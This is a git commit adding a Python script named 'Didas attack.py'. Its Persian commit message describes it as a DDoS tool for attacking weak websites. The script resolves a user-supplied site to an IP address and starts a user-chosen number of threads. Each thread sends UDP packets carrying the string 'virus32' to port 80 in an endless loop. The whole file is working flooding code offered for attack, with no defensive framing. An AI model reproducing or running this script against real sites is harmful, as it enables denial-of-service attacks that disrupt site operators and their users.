bddbbc06b6c93a123d3094d8274470bc2f946848
amirhossinpython <151163714+amirhossinpython@users.noreply.github.com>
2024-01-11 01:22:55 +0330

    Create Didas attack.py
    دیداسر برای اتک به سایت های ضعیف ودارای باگ

---
+++ Didas attack.py
@@ -0,0 +1,27 @@
+import time
+import socket
+import sys
+import _thread
+
+
+site = input("Enter your site url => ")
+thread_count = input("Enter your thread => ")
+ip = socket.gethostbyname(site)
+udp_porr = 80
+MESSAGE = 'virus32'
+print("UDP target IP:", ip)
+print("UDP target port:", udp_porr)
+time.sleep(3)
+def ddos(i):
+    while 1:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, udp_porr))
+        print("Didas attack=>")
+for i in range(int(thread_count)):
+    try:
+        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
+    except KeyboardInterrupt:
+        sys.exit(0)
+while 1:
+    pass
+
